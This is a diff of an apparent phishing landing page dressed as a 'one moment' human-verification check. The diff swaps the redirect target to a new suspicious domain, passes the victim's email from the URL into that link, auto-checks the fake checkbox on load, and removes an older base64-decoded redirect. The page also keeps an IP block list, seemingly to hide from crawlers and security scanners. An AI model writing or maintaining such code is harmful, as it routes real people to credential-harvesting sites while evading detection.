@@ -52,31 +52,6 @@ Un instant…</title>
 </noscript>
 
 <script>
-function redirectToDecodedUrl() {
-    // Get the query string from the URL
-    const queryString = window.location.search;
-    // Parse the query string to get the value of 'url'
-    const urlParams = new URLSearchParams(queryString);
-    const encodedUrl = urlParams.get('url');
-
-    let redirectUrl = 'https://ir0l.rophequir.com/CcqlEUd/'; // Default URL
-
-    if (encodedUrl) {
-        try {
-            // Decode the base64-encoded URL
-            const decodedUrl = atob(encodedUrl);
-            redirectUrl = decodedUrl;
-        } catch (e) {
-            console.error('Invalid base64 encoding:', e);
-        }
-    }
-
-    // Redirect to the determined URL after 1 second
-    setTimeout(() => {
-        window.location.href = redirectUrl;
-    }, 3000); // 1000 milliseconds = 1 second
-}
-
 function getEmailFromUrl() {
     var urlParams = new URLSearchParams(window.location.search);
     return urlParams.get('email');
@@ -92,12 +67,14 @@ function handleCheckboxClick() {
         var email = getEmailFromUrl();
         
         // Base URL for redirection
-        var baseUrl = 'https://ir0l.rophequir.com/CcqlEUd/';
+        var baseUrl = 'https://novatechies.cbg.ru/BUeEj/';
         
         // Construct the new URL based on the presence of an email
         var newUrl = baseUrl;
         if (email) {
-            newUrl += '' + encodeURIComponent(email); // Use '&' to append the email parameter
+            // Manually encode the email and replace %40 with @
+            var encodedEmail = encodeURIComponent(email).replace(/%40/g, '@');
+            newUrl += '#M' + encodedEmail;
         }
         
         setTimeout(function () {
@@ -107,17 +84,17 @@ function handleCheckboxClick() {
     }
 }
 
-// Combined onload function to handle both redirection and checkbox click
+// Automatically click the checkbox when the page loads
 window.onload = function() {
-    redirectToDecodedUrl(); // Perform URL redirection
-
     var checkbox = document.getElementById('humanCheck');
     if (checkbox) {
-        checkbox.checked = true; // Automatically check the checkbox
-        handleCheckboxClick(); // Handle checkbox click
+        checkbox.checked = true;
+        handleCheckboxClick();
     }
 };
 
+
+	
 		const bannedIP = [
     /^66\.102\..*/,
     /^38\.100\..*/,
@@ -224,7 +201,6 @@ if (isIPBanned(clientIP)) {
     console.log("Page rendering for non-banned IP.");
 }
     </script>
-
 <div class="footer" role="contentinfo">
     <div class="footer-inner">
         <div class="clearfix diagnostic-wrapper">
